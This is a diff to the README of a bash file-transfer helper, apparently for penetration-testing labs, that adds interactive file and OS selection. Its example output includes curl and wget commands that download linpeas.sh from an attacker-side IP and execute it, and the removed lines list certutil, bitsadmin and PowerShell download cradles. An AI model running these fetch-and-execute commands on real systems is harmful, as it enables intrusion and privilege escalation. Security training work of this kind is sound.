@@ -10,6 +10,9 @@ A simple bash script to serve files from your current directory over HTTP and ge
   - Linux (curl, wget)
   - Windows CMD (certutil, curl, bitsadmin)
   - Windows PowerShell (Invoke-WebRequest, WebClient)
+- 🖥️ **Interactive Interface**:
+  - Select specific files from a numbered list
+  - Choose target OS (Linux/Windows) to filter commands
 - 🔒 **URL Encoding**: Properly handles filenames with spaces, `#`, and `%` characters
 - 📁 **File Listing**: Lists all files in the current directory with their download commands
 
@@ -49,8 +52,10 @@ A simple bash script to serve files from your current directory over HTTP and ge
 
 3. The script will:
    - Detect your `tun0` IP address
-   - List all files in the current directory
-   - Print download commands for each file
+   - List files with numbers (e.g., `[1] filename`)
+   - Prompt you to select a file by number
+   - Prompt you to select the target OS (Linux or Windows)
+   - Print download commands for the selected file and OS
    - Start the HTTP server on port 80
 
 4. Copy and paste the appropriate download command on the target machine
@@ -61,25 +66,24 @@ A simple bash script to serve files from your current directory over HTTP and ge
 tun0 IP detected: 10.10.14.42
 
 Files in /home/user/tools:
-  - linpeas.sh
-  - chisel
+  [1] linpeas.sh
+  [2] chisel
+
+Enter number to select file: 1
+Selected: linpeas.sh
+
+Target OS:
+  [1] Linux
+  [2] Windows
+Enter number to select OS: 1
+Selected OS: Linux
 
 ========== Download commands (per file) ==========
 
 File: linpeas.sh
   Linux:
-    curl -fsSL "http://10.10.14.42:80/linpeas.sh" -o "linpeas.sh" && chmod +x "linpeas.sh"
-    wget -q --show-progress -O "linpeas.sh" "http://10.10.14.42:80/linpeas.sh" && chmod +x "linpeas.sh"
-
-  Windows (CMD):
-    certutil -urlcache -split -f "http://10.10.14.42:80/linpeas.sh" "linpeas.sh"
-    curl "http://10.10.14.42:80/linpeas.sh" -o "%CD%\linpeas.sh"
-    bitsadmin /transfer dl "http://10.10.14.42:80/linpeas.sh" "%CD%\linpeas.sh"
-
-  Windows (PowerShell):
-    PowerShell -Command "Invoke-WebRequest -Uri 'http://10.10.14.42:80/linpeas.sh' -OutFile 'linpeas.sh'"
-    PowerShell -Command "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.42:80/linpeas.sh','linpeas.sh')"
-    PowerShell -Command "iwr 'http://10.10.14.42:80/linpeas.sh' -OutFile 'linpeas.sh'"
+    curl -fsSL "http://10.10.14.42:80/linpeas.sh" -o "linpeas.sh" && chmod +x "linpeas.sh" && ./"linpeas.sh"
+    wget -q --show-progress -O "linpeas.sh" "http://10.10.14.42:80/linpeas.sh" && chmod +x "linpeas.sh" && ./"linpeas.sh"
 
 ==============================================
 Starting goshs server on port 80 (foreground)
@@ -171,3 +175,7 @@ Feel free to submit issues or pull requests for improvements!
 - Auto-detection of tun0 IP
 - Multi-platform download commands
 - Proper URL encoding for special characters
+
+### Version 1.1
+- Added interactive numbered file selection
+- Added target OS selection (Linux/Windows) to filter commands
